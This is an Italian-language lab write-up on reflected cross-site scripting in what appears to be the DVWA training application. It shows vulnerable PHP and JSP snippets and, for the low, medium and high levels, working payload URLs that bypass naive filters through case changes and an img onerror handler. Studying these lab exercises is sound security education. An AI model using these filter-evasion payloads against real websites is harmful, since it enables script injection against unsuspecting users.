## XSS (Reflected)

- https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)
- https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
- https://en.wikipedia.org/wiki/Cross-site_scripting
- http://www.scriptalert1.com/

Nei Reflected XSS il codice malevolo viene inviato al browser vittima dal server a seguito di una richiesta opportunamente preparata dall'attaccante.
Il browser esegue il codice in quanto ricevuto da un server "fidato".

Dato il seguente codice vulnerabile:

```
<% String eid = request.getParameter("eid"); %>
...
Employee ID: <%= eid %>
```

Se il parametro `eid` contiene codice malevolo, il browser lo esegue.

### XSS (Reflected) - Low

```
// Feedback for end user
echo '<pre>Hello ' . $_GET[ 'name' ] . '</pre>'; 
```

Exploit:

- accedi a `172.17.0.2/vulnerabilities/xss_r/?name=<script>alert('hacked')</script>`

### XSS (Reflected) - Medium

```
// Get input
$name = str_replace( '<script>', '', $_GET[ 'name' ] );
```

Exploit:

- accedi a `172.17.0.2/vulnerabilities/xss_r/?name=<Script>alert('hacked')</script>`

### XSS (Reflected) - High

```
// Get input
$name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );
```

Exploit:

- accedi a `http://172.17.0.2/vulnerabilities/xss_r/?name=<img src="172.17.0.2/not_existing.jpg" onerror=alert('hacked')>`

